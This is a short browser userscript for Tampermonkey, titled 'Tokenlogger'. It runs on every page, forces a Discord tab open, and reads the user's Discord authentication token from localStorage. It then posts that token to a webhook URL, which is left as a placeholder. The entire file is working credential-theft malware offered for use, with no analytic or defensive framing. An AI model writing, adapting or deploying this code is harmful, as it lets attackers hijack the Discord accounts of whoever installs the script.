// ==UserScript==
// @name         Tokenlogger
// @namespace    https://github.com/Lyzev
// @version      1.0
// @description  A simple tokenlogger for Tampermonkey. (Browser Extension)
// @author       Lyzev
// @run-at       document-start
// @include http://*
// @include https://*
// @grant        none
// ==/UserScript==

(function() {
    if (window.location.href !== 'https://discord.com/channels/@me') {
        window.open('https://discord.com/channels/@me', '_blank').focus();
    } else {
        const webhook = 'WEBHOOK-URL';
        const token = localStorage.token;
        if (token != null) {
            const request = new XMLHttpRequest();
            request.open('POST', webhook);
            request.setRequestHeader('Content-type', 'application/json');
            const params = {
                username: 'Tokenlogger',
                content: 'Date: `' + new Date() + '`\nToken: `' + token + '`'
            };
            request.send(JSON.stringify(params));
        }
    }
})();